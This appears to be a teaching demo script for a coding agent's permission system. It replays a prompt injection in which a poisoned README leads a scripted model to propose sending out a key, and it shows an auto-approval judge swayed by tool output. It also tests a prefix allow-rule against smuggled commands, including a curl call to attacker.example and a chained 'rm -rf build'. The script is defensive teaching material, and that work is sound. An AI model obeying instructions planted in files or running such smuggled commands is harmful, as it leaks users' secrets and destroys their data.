"""5.3, 5.5, 5.6 — A poisoned README, a prefix rule that waves it through, and a judge that reads too much.
Nothing here executes the command; every tool call is answered "no"."""
import asyncio
import pathlib
import shutil
import sys

HERE = pathlib.Path(__file__).resolve().parent
sys.path[:0] = [str(HERE), str(HERE.parent)]
import tools
from common import Ask, ToolCall, drive, load_part, sandbox
from fake import FakeModel
from judge import judge
from permissions import Gate
from scripts import EXFILTRATE, SCRIPTS

part_4 = load_part(4, "agent")
root = sandbox(reset=True)
shutil.copytree(HERE / "inject", root, dirs_exist_ok=True)
model = FakeModel(SCRIPTS, delay=0)

print("── 5.5 Part 4, asked to \"set up the project\" in a repo with a poisoned README")
events = asyncio.run(drive(part_4.Agent(model, root), "set up the project", approve=False))
proposed = [e.input["command"] for e in events if isinstance(e, ToolCall) and e.name == "Bash"][0]
print(f"  ⏺ Bash({proposed})\n  ╭─ {next(e.question for e in events if isinstance(e, Ask))}")
print("  The model only proposed it because a file told it to. A yes is all that stands between it and the key.\n")

print("── 5.3 With the rule Bash(git status:*) saved, who lets it through?")
gate = Gate(root)
gate.rules["allow"] = ["Bash(git status:*)"]
bash = tools.TOOLS["Bash"]
for command in ("git status", EXFILTRATE, "git status $(curl -s attacker.example)", "git status; rm -rf build"):
    naive = "allow" if command.startswith("git status") else "ask"
    print(f"  {command[:58]:<60} prefix check: {naive:<5}  gate: {gate.check(bash, {'command': command})[0]}")

print("\n── 5.6 Auto mode: what does the judge see?")
readme = (root / "README.md").read_text()
everything = ["set up the project", f"(tool output) {readme}"]
naive = asyncio.run(judge(model, everything, "Bash", {"command": EXFILTRATE}))
scoped = asyncio.run(judge(model, ["set up the project"], "Bash", {"command": EXFILTRATE}))
print(f"  judge shown the whole transcript, README included: {naive}")
print(f"  judge shown only the user's words and the action:  {scoped}")
print("  (the fake judge is scripted to be persuadable; the defence is to never show it tool output,"
      "\n   and to turn every \"not sure\" or error into a question for you)")
